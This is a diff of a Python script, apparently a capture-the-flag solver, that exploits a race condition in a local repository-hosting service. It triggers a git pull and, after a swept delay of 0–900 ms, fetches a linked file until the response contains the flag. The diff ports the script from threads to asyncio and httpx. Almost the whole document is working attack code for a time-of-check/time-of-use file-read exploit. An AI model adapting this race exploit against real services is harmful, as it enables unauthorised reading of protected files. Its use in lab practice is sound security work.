@@ -1,43 +1,17 @@
 import subprocess
-import threading
-import time
-
-import requests
+import asyncio
+import httpx
 
 BASE_URL = "http://localhost:8045"
 USER = "MrVasya"
 NAME = "test"
 FILENAME = "flaglink"
 
-DELAY_START = 0  # 600 ms
-DELAY_END = 0.9  # 900 ms
-STEP = 0.01  # 20 ms шаг
+DELAY_START = 0     # 0 секунд
+DELAY_END = 0.9     # 0.9 секунд
+STEP = 0.01         # 10 мс
 
-FLAG = "FLAG"  # что ищем в теле
-
-
-def fetch_file(result_container):
-    try:
-        print("starting fetch file...")
-        url = f"{BASE_URL}/repo/{USER}/{NAME}/file/{FILENAME}"
-        r = requests.get(url)
-        print("got file contents")
-        r.raise_for_status()
-        if FLAG in r.text:
-            result_container["success"] = True
-            result_container["content"] = r.text
-    except Exception:
-        pass
-
-
-def trigger_update():
-    try:
-        url = f"{BASE_URL}/repo/{USER}/{NAME}/pull"
-        data = {"remote": "origin", "branch": "main"}
-        requests.post(url, data=data)
-        print("repo updated")
-    except Exception:
-        pass
+FLAG = "FLAG"       # что ищем в теле
 
 
 def run_script(path):
@@ -46,11 +20,30 @@ def run_script(path):
     )
 
 
-for delay in [
-    DELAY_START + i * STEP for i in range(int((DELAY_END - DELAY_START) / STEP) + 1)
-]:
-    print(f"Trying delay: {int(delay*1000)} ms", flush=True)
+async def fetch_file(client, result_container):
+    try:
+        print("starting fetch file...", flush=True)
+        url = f"{BASE_URL}/repo/{USER}/{NAME}/file/{FILENAME}"
+        r = await client.get(url)
+        print("got file contents", flush=True)
+        if FLAG in r.text:
+            result_container["success"] = True
+            result_container["content"] = r.text
+    except Exception:
+        pass
 
+
+async def trigger_update(client):
+    try:
+        url = f"{BASE_URL}/repo/{USER}/{NAME}/pull"
+        data = {"remote": "origin", "branch": "main"}
+        await client.post(url, data=data)
+        print("repo updated", flush=True)
+    except Exception:
+        pass
+
+
+async def try_delay(delay):
     # Убираем флаг
     run_script("./remove_flag.sh")
 
@@ -59,19 +52,29 @@ for delay in [
 
     result = {"success": False, "content": ""}
 
-    t_fetch = threading.Thread(target=fetch_file, args=(result,))
-    t_update = threading.Thread(target=trigger_update)
+    async with httpx.AsyncClient() as client:
+        # Запускаем update и fetch_file почти одновременно с задержкой
+        task_update = asyncio.create_task(trigger_update(client))
+        await asyncio.sleep(delay)
+        task_fetch = asyncio.create_task(fetch_file(client, result))
 
-    t_update.start()
-    time.sleep(delay)
-    t_fetch.start()
+        # Ждём завершения обоих
+        await asyncio.gather(task_update, task_fetch)
 
-    t_fetch.join()
-    t_update.join()
+    return result
 
-    if result["success"]:
-        print(f"SUCCESS with delay {int(delay*1000)} ms")
-        print(result["content"])
-        break
-    else:
-        print(f"Failed with delay {int(delay*1000)} ms")
+
+async def main():
+    for delay in [DELAY_START + i * STEP for i in range(int((DELAY_END - DELAY_START) / STEP) + 1)]:
+        print(f"Trying delay: {int(delay*1000)} ms", flush=True)
+        result = await try_delay(delay)
+        if result["success"]:
+            print(f"SUCCESS with delay {int(delay*1000)} ms", flush=True)
+            print(result["content"], flush=True)
+            break
+        else:
+            print(f"Failed with delay {int(delay*1000)} ms", flush=True)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
